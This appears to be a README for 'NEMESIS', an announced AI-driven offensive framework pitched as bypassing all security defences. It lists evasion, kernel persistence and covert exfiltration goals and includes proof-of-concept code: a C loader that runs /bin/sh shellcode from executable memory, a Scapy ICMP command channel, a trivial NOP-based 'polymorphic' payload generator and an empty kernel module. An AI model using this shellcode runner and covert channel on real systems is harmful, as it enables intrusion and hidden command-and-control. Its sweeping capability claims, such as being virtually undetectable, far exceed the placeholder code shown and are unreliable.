# Project: NEMESIS

## Coming soon.

(Neural Engine for Machine-code Exploitation, Stealth, and Intelligence Scripting)

NEMESIS is a next-generation AI-driven, machine-code-based red teaming and penetration testing framework. It is built to bypass all modern defenses, including WAFs, EDRs, CDNs, load balancers, honeypots, and AI-driven security models, while operating entirely in raw binary code at the processor level.

This project aims to redefine red teaming capabilities by incorporating machine learning, direct hardware exploitation, autonomous decision-making, and advanced stealth techniques, making it virtually undetectable.

Project Development Plan

Development Phases & Roadmap

Core Components

1. Binary Payload Engine

✅ Dynamic machine code generation based on CPU type (x86, ARM, MIPS, RISC-V, etc.)
✅ Direct processor exploitation (ROP, JIT spraying, kernel-mode execution)
✅ AI-based obfuscation of opcodes for evasion

2. AI-Driven Exploitation Engine

✅ Machine learning model detects & adjusts attack vectors in real time
✅ Automated selection of most effective payload per target environment
✅ Reinforcement learning to improve attack success rates over time

3. Advanced Memory & Kernel Manipulation

✅ Ring-0 / kernel privilege escalation
✅ Direct kernel memory manipulation (bypassing syscall hooks)
✅ Firmware, UEFI, and SMM persistence techniques

4. Covert C2 & Stealth Communication

✅ ICMP/DNS tunneling, encrypted raw sockets, GPU-based exfiltration
✅ Side-channel attacks leveraging electromagnetic emissions & power analysis
✅ Hiding payloads in hardware (e.g., CPU caches, disk firmware, BIOS)

5. Evasion & Anti-Detection

✅ Self-modifying, polymorphic machine code
✅ Execution in encrypted memory regions to avoid forensic detection
✅ Uses direct syscalls instead of API hooks to bypass AV/EDR logging

6. Autonomous & Augmented Operation

✅ Autonomous attack selection, execution, and adaptation
✅ Augmented mode allows manual input with AI assistance
✅ Multi-targeting & parallel execution for large-scale red teaming

Project Development Breakdown

This section details the specific features, coding languages, and technologies that will be used to bring NEMESIS to life.

1. Machine Code Execution & Payload Engine

Language: C, Assembly, Rust

Functionality:

Dynamically generate raw binary payloads

Execute machine code directly in memory

CPU-agnostic shellcode creation



PoC Example (x86 Payload Execution in C):
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

// Simple x86_64 shellcode (executes /bin/sh)
unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x50\x48\x89\xe6\x50\x48\x89"
                            "\xe1\x50\x48\x8d\x3d\x04\x00\x00\x00\x57\x48\x89\xe6\xb0"
                            "\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00";

void execute_shellcode() {
    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
}

int main() {
    execute_shellcode();
    return 0;
}
```

2. AI-Driven Exploitation

Language: Python (PyTorch, TensorFlow), Rust (for speed)

Functionality:

AI models analyze security environment

Dynamically modify exploits based on real-time analysis

Reinforcement learning improves attack success rate



PoC Example: AI-Based Payload Mutation:
```python
import random

opcode_variants = [b"\x90", b"\x66\x90", b"\x0F\x1F\x00", b"\x0F\x1F\x40\x00"]

def generate_polymorphic_payload(size=50):
    payload = b"".join(random.choice(opcode_variants) for _ in range(size))
    return payload

polymorphic_payload = generate_polymorphic_payload()
print(f"Generated Payload: {polymorphic_payload.hex()}")
```

---

3. Covert Communication

ICMP C2 Channel (Python + Scapy)

```python
from scapy.all import *

def send_icmp_command(target_ip, command):
    icmp_packet = IP(dst=target_ip)/ICMP()/Raw(load=command)
    send(icmp_packet)

def listen_icmp():
    def icmp_handler(pkt):
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
            print(f"Received Command: {pkt[Raw].load.decode()}")
    
    sniff(filter="icmp", prn=icmp_handler)

# Example usage:
# send_icmp_command("192.168.1.100", "ls -la")
# listen_icmp()
```

---

4. Kernel Memory Manipulation

Linux Kernel Module (C)

```C
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init nemesis_init(void) {
    printk(KERN_INFO "Nemesis Kernel Module Loaded\n");
    return 0;
}

static void __exit nemesis_exit(void) {
    printk(KERN_INFO "Nemesis Kernel Module Unloaded\n");
}

module_init(nemesis_init);
module_exit(nemesis_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Nemesis Kernel-Level Attack Module");
```
